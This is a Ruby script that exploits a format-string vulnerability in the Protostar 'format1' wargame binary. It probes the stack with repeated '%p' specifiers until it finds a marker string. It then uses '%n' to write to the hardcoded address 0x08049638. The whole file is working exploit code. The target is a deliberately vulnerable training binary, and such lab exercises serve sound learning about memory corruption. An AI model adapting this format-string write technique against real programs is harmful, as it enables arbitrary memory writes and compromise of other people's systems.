#!/usr/bin/ruby

# convert ASCII to Hex in Little Endian
# str: String
# return: String
def to_hex(str)
        # convert to 32 bit integers in small endian
        # the tmp is Array
        tmp = str.unpack('N*')
        # encode these integers with big endian
        tmp = tmp.pack('V*')
        # encode the result in hexadecimal
        tmp = tmp.unpack('H*')
        # convert Array to String
        return tmp * ""
end

# address of target: 0x08049638
target = "\x38\x96\x04\x08"
breadcrumb = "ABCD"
times = 1
maximum = 200

while times < maximum
	command = <<-END
/opt/protostar/bin/format1 "#{breadcrumb} #{"%p " * times}"
	END
	result = `#{command}`
	if result.include? to_hex(breadcrumb) then break end
        if times == maximum then abort("err") end
	times += 1
end

puts result
puts "> %p appeared #{times} times"

breadcrumb_index = result.split.index("0x" + to_hex(breadcrumb))
puts "> breadcrumb appeared in the #{breadcrumb_index} %p"

command = <<-END
/opt/protostar/bin/format1 "#{target} #{"%p " * (breadcrumb_index - 1)}%n #{"%p " * (times - breadcrumb_index)}"
END

puts "> exec: #{command}"
puts `#{command}`


